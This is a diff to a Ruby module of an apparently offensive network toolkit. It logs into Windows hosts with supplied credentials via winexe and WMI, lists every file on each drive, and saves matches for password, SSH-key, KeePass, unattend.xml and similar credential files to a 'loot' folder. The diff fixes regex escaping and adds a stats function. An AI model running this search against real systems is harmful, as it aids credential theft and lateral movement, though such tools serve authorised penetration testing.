@@ -10,17 +10,17 @@ class Filefind < Poet::Scanner
 	
 	# formats and extensions 
 	# ie: %OFFICE%, %PASSWORD%, %KEYFILES%  
-	OFFICE_EXT = ".*xls$, .*csv$, .*doc$, .*docx$, .*pdf$"
-	PASSWORD_EXT = "accounts.xml$, unattend.xml$, unattend.txt$, sysprep.xml$, .*passwd$, passwd$, shadow$, passwd~$, shadow~$, passwd-$, shadow-$, tomcat-users.xml$, RazerLoginData.xml$, ultravnc.ini$, profiles.xml$, spark.properties$, steam.vdf$, WinSCP.ini$, accounts.ini$, ws_ftp.ini$, svn.simple$, config.dyndns$, FileZilla.Server.xml$"
-	KEYFILES_EXT = ".*kbdx$, .*ppk$, id_rsa, .*pem$, .*crt$, .*key$"
-	CONFIG_EXT = ".*cfg$, .*inf$, .*ini$, .*config$, .*conf$, .*setup$, .*cnf$, pref.*xml$, .*preferences$, .*properties$"
-	BATCH_EXT = ".*bat$, .*sh$, .*ps$, .*ps1$, .*vbs$, .*run$"
-	MAIL_EXT = ".*pst$, .*mbox$, .*spool$"
-	VM_EXT = ".*vmem$, .*ova$, .*vmdk$, .*snapshot$, .*vdi$"
-	DB_EXT = ".*sql$, .*db$, .*sqlite."
+	OFFICE_EXT = ".*\\.xls$, .*\\.csv$, .*\\.doc$, .*\\.docx$, .*\\.pdf$"
+	PASSWORD_EXT = "accounts.xml$, unattend.xml$, unattend.txt$, sysprep.xml$, .*\\.passwd$, passwd$, shadow$, passwd~$, shadow~$, passwd-$, shadow-$, tomcat-users.xml$, RazerLoginData.xml$, ultravnc.ini$, profiles.xml$, spark.properties$, steam.vdf$, WinSCP.ini$, accounts.ini$, ws_ftp.ini$, svn.simple$, config.dyndns$, FileZilla.Server.xml$"
+	KEYFILES_EXT = ".*\\.kbdx$, .*\\.ppk$, id_rsa, .*\\.pem$, .*\\.crt$, .*\\.key$"
+	CONFIG_EXT = ".*\\.cfg$, .*\\.inf$, .*\\.ini$, .*\\.config$, .*\\.conf$, .*\\.setup$, .*\\.cnf$, pref.*\\.xml$, .*\\.preferences$, .*\\.properties$, config.*\\.xml$"
+	BATCH_EXT = ".*\\.bat$, .*\\.sh$, .*\\.ps$, .*\\.ps1$, .*\\.vbs$, .*\\.run$"
+	MAIL_EXT = ".*\\.pst$, .*\\.mbox$, .*\\.spool$"
+	VM_EXT = ".*\\.vmem$, .*\\.ova$, .*\\.vmdk$, .*\\.snapshot$, .*\\.vdi$, .*\\.vmx$"
+	DB_EXT = ".*\\.sql$, .*\\.db$, .*\\.sqlite."
 	
 	# easy mode
-	ALL_EXT = OFFICE_EXT + PASSWORD_EXT + KEYFILES_EXT + CONFIG_EXT + BATCH_EXT + MAIL_EXT + VM_EXT + DB_EXT
+	ALL_EXT = OFFICE_EXT + "," + PASSWORD_EXT + "," + KEYFILES_EXT + "," + CONFIG_EXT + "," + BATCH_EXT + "," + MAIL_EXT + "," + VM_EXT + "," + DB_EXT
 	@snapshot = false
 	
 	def setup
@@ -29,21 +29,20 @@ class Filefind < Poet::Scanner
 
 		@timeout = 0
 		@regexes = Array.new
+		@dropfile = random_name
 		
-		searches = "#{color_banner('%OFFICE%')} : .*xls$, .*csv$, .*doc$, .*docx$, .*pdf$\n"
-		searches  << "#{color_banner('%PASSWORD%')} : accounts.xml$, unattend.xml$, unattend.txt$, sysprep.xml$, .*passwd$, passwd$, shadow$, passwd~$, shadow~$, passwd-$, shadow-$, tomcat-users.xml$, RazerLoginData.xml$, ultravnc.ini$, profiles.xml$, spark.properties$, steam.vdf$, WinSCP.ini$, accounts.ini$, ws_ftp.ini$, svn.simple$, config.dyndns$, FileZilla.Server.xml$\n"
-		searches  << "#{color_banner('%KEYFILES%')} : .*kbdx$, .*ppk$, id_rsa, .*pem$, .*crt$, .*key$\n"
-		searches  << "#{color_banner('%CONFIG%')} : .*cfg$, .*inf$, .*ini$, .*config$, .*conf$, .*setup$, .*cnf$, pref.*xml$, .*preferences$, .*properties$\n"
-		searches  << "#{color_banner('%BATCH%')} : .*bat$, .*sh$, .*ps$, .*ps1$, .*vbs$, .*run$\n"
-		searches  << "#{color_banner('%MAIL%')} : .*pst$, .*mbox$, .*spool$\n"
-		searches  << "#{color_banner('%VM%')} : .*vmem$, .*ova$, .*vmdk$, .*snapshot$, .*vdi$\n"
-		searches  << "#{color_banner('%DB%')} -> .*sql$, .*db$, .*sqlite.\n\n"
+		searches = "#{color_banner('%OFFICE%')} : .*\\.xls$, .*\\.csv$, .*\\.doc$, .*\\.docx$, .*\\.pdf$\n"
+		searches  << "#{color_banner('%PASSWORD%')} : accounts.xml$, unattend.xml$, unattend.txt$, sysprep.xml$, .*\\.passwd$, passwd$, shadow$, passwd~$, shadow~$, passwd-$, shadow-$, tomcat-users.xml$, RazerLoginData.xml$, ultravnc.ini$, profiles.xml$, spark.properties$, steam.vdf$, WinSCP.ini$, accounts.ini$, ws_ftp.ini$, svn.simple$, config.dyndns$, FileZilla.Server.xml$\n"
+		searches  << "#{color_banner('%KEYFILES%')} : .*\\.kbdx$, .*\\.ppk$, id_rsa, .*\\.pem$, .*\\.crt$, .*\\.key$\n"
+		searches  << "#{color_banner('%CONFIG%')} : .*\\.cfg$, .*\\.inf$, .*\\.ini$, .*\\.config$, .*\\.conf$, .*\\.setup$, .*\\.cnf$, pref.*\\.xml$, .*\\.preferences$, .*\\.properties$, config.*\\.xml$\n"
+		searches  << "#{color_banner('%BATCH%')} : .*\\.bat$, .*\\.sh$, .*\\.ps$, .*\\.ps1$, .*\\.vbs$, .*\\.run$\n"
+		searches  << "#{color_banner('%MAIL%')} : .*\\.pst$, .*\\.mbox$, .*\\.spool$\n"
+		searches  << "#{color_banner('%VM%')} : .*\\.vmem$, .*\\.ova$, .*\\.vmdk$, .*\\.snapshot$, .*\\.vdi$, .*\\.vmx$\n"
+		searches  << "#{color_banner('%DB%')} -> .*\\.sql$, .*\\.db$, .*\\.sqlite.\n\n"
 		searches  << "#{color_banner('%ALL%')} : Combination of all of the above (default: [#{color_banner('%ALL%')}]):"
 		
 		print "Enter path to newline separated file containing filenames to search for, or enter in comma separated files in the form of regular expressions. (Substitutions exist for commonly useful filetypes and extensions:\n#{searches}"
 		ext = rgets
-		puts 
-		
 		if ext.empty?
 			ext = "%ALL%"
 		# Get valid path
@@ -62,7 +61,7 @@ class Filefind < Poet::Scanner
 		
 		# Perhaps make a check for TEMP files that are writeable - do a write check and confirm.
 		@command = ''
-		@command << '& dir /s /b > C:\\'
+		@command << "& dir /s /b > C:\\#{@dropfile}"
 		
 		# substitute our prefills
 		subd = ''
@@ -88,14 +87,31 @@ class Filefind < Poet::Scanner
 		title = "File Finder"
 		puts color_header(title)
 	end
-
+	def stats(files)
+		ret = ''
+		files_array = Array.new
+		files_array = files.split("\r\n")
+		
+		ret << "Stats:\n"
+		@regexes.each do |match|
+			count = 0
+			files_array.each do |file|
+				if file.scan(/#{match.gsub(/\\\\/, "\\")}/).size > 0
+					count = count + 1
+				end
+			end
+			if count > 0
+				ret << "#{match} : #{count} file(s) found\n" 
+			end
+		end
+		return ret
+	end
 	def run(username, password, host)
 		smboptions = "//#{host}"
 		files_found = ''
 		all_files = ''
-		drives = []
-		dropfile = random_file
-	
+		drives = []		
+
 		wmic = smbwmic(smboptions, "select Description,DeviceID from Win32_logicaldisk")
 		wmic.lines.each do |line|
 			next if line =~ /Description|DeviceID/ or not line.include? '|'
@@ -109,15 +125,14 @@ class Filefind < Poet::Scanner
 			# If final one, add uninstall to winexe
 			smboptions = "--uninstall #{smboptions}" if drive.eql? drives.last
 			## TODO: redo, cd [drive] doesnt work, misses all except current drive (C:\)
-			find = winexe(smboptions, "CMD /C cd #{drive}\\#{@command}#{dropfile}")
+			find = winexe(smboptions, "CMD /C cd #{drive}\\#{@command}")
 			# Continue on if nothing found
 			next if find =~ /File Not Found/
 			# Pull full list for later should we want it sans anything in the C:\windows dir (waste)?
 			files_found << find
 
-			### Convert to local SMB share when implemented
 			if @snapshot
-				all_files = winexe(smboptions, "CMD /C type C:\\#{dropfile} && del C:\\#{dropfile}")
+				all_files = winexe(smboptions, "CMD /C type C:\\#{@dropfile} && del C:\\#{@dropfile}")
 			end
 		end
 
@@ -132,11 +147,13 @@ class Filefind < Poet::Scanner
 				print_good("#{host.ljust(15)} - #{files_print.join(', ')} found")
 			end
 			@success += files_found.lines.count
-
+			
+			puts stats(files_found)
+			
 			begin
 				File.open("#{@log}/loot/filefinder/#{host}_filelist.txt", 'a') { |file| file.write(files_found) }
 			rescue
-				print_bad("#{Chost}: Issues Writing to #{@log}")
+				print_bad("#{host}: Issues Writing to #{@log}")
 			end
 		end
 
@@ -154,9 +171,10 @@ class Filefind < Poet::Scanner
 				@success += all_files.lines.count
 				
 				begin
-					File.open("#{@log}/loot/filefinder/#{host}_allfiles.txt", 'a') { |file2| file2.write(all_files) }
+					# Overwrite, TODO: check if file exists and inform user we're overwriting the snapshot
+					File.open("#{@log}/loot/filefinder/#{host}_allfiles.txt", 'w') { |file2| file2.write(all_files) }
 				rescue
-					print_bad("#{Chost}: Issues Writing to #{@log}")
+					print_bad("#{host}: Issues Writing to #{@log}")
 				end
 			end
 		end
